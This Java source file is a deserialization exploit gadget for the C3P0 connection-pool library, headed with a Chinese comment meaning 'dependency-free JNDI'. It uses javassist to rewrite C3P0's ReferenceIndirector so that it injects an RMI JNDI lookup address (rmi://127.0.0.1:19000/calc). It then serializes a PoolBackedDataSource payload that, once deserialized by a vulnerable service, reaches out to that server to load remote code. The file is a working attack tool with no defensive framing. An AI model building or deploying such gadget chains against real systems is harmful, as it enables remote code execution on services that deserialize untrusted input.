package gadget;

import java.io.*;
import java.lang.reflect.Method;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import javassist.*;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

//C3P0无依赖JNDI
public class C3P0JNDI {
    public static void main(String[] args) throws Exception{
//        Thread.sleep(5000);//sleep一会
        hook();
        PoolBackedDataSource a = new PoolBackedDataSource();
        a.setConnectionPoolDataSource(new PoolSource());
//        writeFile("1.txt",serialize(a));
        deserialize(FiletoBytes("1.txt"));
    }
    public static void hook() throws ClassNotFoundException, NoSuchMethodException, NotFoundException, CannotCompileException {
        CtClass ctClass = ClassPool.getDefault().get("com.mchange.v2.naming.ReferenceIndirector");
        CtMethod ctMethod = ctClass.getDeclaredMethod("indirectForm");
        ctMethod.insertBefore("java.util.Properties properties = new java.util.Properties();\n" +
                "        javax.naming.CompoundName compoundName = new javax.naming.CompoundName(\"rmi://127.0.0.1:19000/calc\",properties);" +
                "contextName=compoundName;");
        ctClass.toClass();
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        public PoolSource () {
        }

        public Reference getReference () throws NamingException {
            return null;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }

    private static void writeFile(String filePath, byte[] content) throws Exception {
        FileOutputStream outputStream = new FileOutputStream(filePath);
        outputStream.write( content );
        outputStream.close();
    }

    public static byte[] FiletoBytes(String filename) throws Exception{
        String buf = null;
        File file = new File(filename);
        FileInputStream fis = null;
        fis = new FileInputStream(file);
        int size = fis.available();
        byte[] bytes = new byte[size];
        fis.read(bytes);
        return bytes;
    }
}
